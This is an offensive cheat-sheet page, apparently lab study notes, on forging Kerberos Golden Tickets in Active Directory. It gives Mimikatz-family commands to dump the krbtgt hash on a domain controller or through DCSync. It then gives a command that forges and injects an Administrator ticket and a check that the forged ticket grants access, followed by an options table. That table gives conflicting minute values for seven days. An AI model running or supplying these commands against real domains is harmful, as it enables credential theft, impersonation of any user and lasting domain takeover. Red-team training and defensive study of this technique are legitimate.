# Golden Ticket

Golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.

Using Golden ticket can be used to impersonate any user with any privileges.



## Obtain krbtgt hash

There are multiple ways to get the krbtgt account hash

```powershell
# Execute on DC as Domain Admin
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc

# DCSync to get AES keys
# Needs Domain admin or Replication Rights
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

## Create The Ticket

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<user_sid> /aes256:<aes_key> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

dir \\dcorp-dc\c$ # check if worked
```
{% endcode %}

<table><thead><tr><th width="318">Options</th><th width="431"></th></tr></thead><tbody><tr><td>kerberos::golden</td><td>Name of the module</td></tr><tr><td>/User:Administrator</td><td>Username for which the TGT is generated</td></tr><tr><td>/domain:</td><td>Domain FQDN</td></tr><tr><td>/sid:</td><td>SID of the domain</td></tr><tr><td>/aes256:</td><td>AES256 keys of the krbtgt account</td></tr><tr><td>/id:500 /groups:512</td><td>Optional User and Group RID</td></tr><tr><td>/ptt or /ticket</td><td>ptt: inject ticket to current process<br>ticket: saves ticket to a file</td></tr><tr><td>/startoffset:0</td><td>Optional when the ticket is available in minutes. <br>Use negative for a ticket available from past and a larger number for future.</td></tr><tr><td>/endin:600</td><td>Optional ticket lifetime in minutes.  (default <strong>10</strong> years)<br>The default AD setting is 10 hours = 600 minutes</td></tr><tr><td>/renewmax:10080</td><td>Optional ticket lifetime with renewal in minutes. (default is <strong>10</strong> years)<br>The default AD setting is 7 days = 100800</td></tr></tbody></table>

